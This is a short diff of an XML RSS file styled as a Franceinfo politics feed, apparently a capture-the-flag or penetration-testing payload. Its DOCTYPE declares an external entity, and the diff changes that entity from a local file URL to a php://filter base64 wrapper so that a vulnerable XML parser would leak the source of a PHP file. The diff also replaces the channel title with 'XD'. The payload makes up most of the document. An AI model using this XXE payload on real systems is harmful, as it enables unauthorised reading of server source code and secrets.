@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "file://localhost/index.php" >]>
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Franceinfo - Politique - Toute l'actualité politique en France</title>
+    <title>Franceinfo - XD - Toute l'actualité politique en France</title>
     <description>Franceinfo - Politique - Toute l'actualité politique en France</description>
     <pubDate>Thu, 24 Feb 2022 10:04:07 +0100</pubDate>
     <generator>francetvinfo 2022 (https://www.francetvinfo.fr)</generator>
